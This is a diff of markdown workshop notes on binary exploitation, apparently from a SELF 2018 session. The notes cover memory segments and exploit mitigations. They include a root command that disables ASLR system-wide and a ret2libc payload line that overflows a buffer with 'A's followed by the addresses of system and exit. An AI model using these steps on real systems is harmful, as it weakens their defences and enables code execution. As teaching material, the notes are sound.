@@ -1,14 +1,30 @@
+# Binary Exploitation at SELF 2018
+## Parker Garrison
+
+```
 To get started
 	You will need the files: segment_mem.c, wisdom.c, runescape.sh, pat_gen.py, pat_ind.py
-	You will need gdb-peda to execute some of the commands.
+	You will need gdb-peda to execute some of the gdb commands such as checksec.
 
 Memory and the Stack
+	Ensure ASLR is off
+		echo 0 > /proc/sys/kernel/randomize_va_space
+	
 	Compile segment_mem.c
 		gcc segment_mem.c -o segment_mem
 	
-	Run this binary to examine addresses in various memory segments:
+	Run this binary to examine addresses which are in various memory segments:
 		./segment_mem
-
+			Address of etext: 080485c8
+			Address of edata: 0804989c
+			Address of end: 080498a8
+			Address in .text: 04244c8d
+			Address in .data: 08048616
+			Address in .data: 08049898
+			Address in .bss: 080498a4
+			Address in heap: 0804a008
+			Address in stack: bffff4ee
+			
 Exploit Mitigations and Bypasses
 	No Mitigations
 		Compile wisdom.c without NX
@@ -88,3 +104,5 @@ Exploit Mitigations and Bypasses
 				args = r"\x20\x8a\x04\x08"
 				
 				print "A"*152 + addr_system_esc + addr_exit_esc + args
+```
+
